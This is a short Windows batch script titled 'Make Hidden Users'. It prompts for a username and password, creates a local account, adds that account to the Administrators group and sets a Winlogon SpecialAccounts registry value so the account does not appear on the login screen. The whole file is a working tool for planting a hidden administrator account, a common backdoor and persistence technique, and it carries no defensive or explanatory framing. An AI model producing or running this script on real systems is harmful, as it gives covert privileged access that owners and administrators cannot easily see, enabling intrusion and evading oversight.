cd\
cls
REM "Make Hidden Users"

@echo off
set /p user=Username:
set /p pass=Pssword:
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
pause
